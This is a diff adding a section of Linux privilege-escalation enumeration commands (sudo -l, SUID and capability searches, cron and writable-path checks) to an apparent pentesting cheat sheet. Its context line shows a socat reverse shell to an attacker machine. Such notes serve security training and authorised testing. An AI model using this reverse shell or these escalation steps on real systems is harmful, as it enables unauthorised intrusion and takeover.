@@ -68,6 +68,27 @@ $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker machine ip>:
 - [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 - [LinEnum](https://github.com/rebootuser/LinEnum)
 
+Check for sudo and compare with GTFOBins
+```
+$ sudo -l
+```
+Find SUID bit
+```
+$ find / -type f -perm -04000 -ls 2>/dev/null
+```
+Find capabilities
+```
+$ getcap -r / 2>/dev/null
+```
+Find root enabled Cron Jobs
+```
+$ cat /etc/crontab
+```
+Find PATH
+$ echo $PATH
+$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+
 ## Starting a Python httpserver
 
 ```
